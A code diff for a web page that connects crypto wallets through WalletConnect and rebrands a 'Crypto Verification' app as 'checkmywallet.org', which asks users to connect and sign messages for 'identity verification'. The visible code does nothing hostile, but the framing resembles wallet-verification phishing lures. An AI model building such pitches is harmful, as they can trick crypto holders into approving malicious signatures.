@@ -33,7 +33,7 @@ export default function Page() {
 
     try {
       const provider = await EthereumProvider.init({
-        projectId: "3b862a3ab6c400686ef1ed9deab38b7d", // Project ID-ul tău WalletConnect
+        projectId: "3b862a3ab6c400686ef1ed9deab38b7d",
         chains: [1],
         showQrModal: true,
         rpcMap: {
@@ -48,10 +48,10 @@ export default function Page() {
           "eth_getBalance"
         ],
         metadata: {
-          name: "Crypto Verification",
-          description: "Secure Crypto Compliance & Wallet Verification",
-          url: "https://cryptoverification.org",
-          icons: ["/logo.png"] // asigură-te că logo.png e în public/
+          name: "checkmywallet.org",
+          description: "A web 3 wallet checker allowing users to connect their wallet and sign message for identity verifications and action approvals",
+          url: "https://checkmywallet.org",
+          icons: ["https://checkmywallet.org/logo.png"]
         }
       });
 
@@ -102,7 +102,7 @@ export default function Page() {
         color: '#fff',
         padding: '90px 0 60px 0'
       }}>
-        <img src="/logo.png" alt="Logo" style={{ width: 80, height: 80, marginBottom: 24, borderRadius: 16, boxShadow: '0 2px 12px #2563eb55' }} />
+        <img src="https://checkmywallet.org/logo.png" alt="Logo" style={{ width: 80, height: 80, marginBottom: 24, borderRadius: 16, boxShadow: '0 2px 12px #2563eb55' }} />
         <h1 style={{
           fontSize: '2.8rem',
           fontWeight: 900,
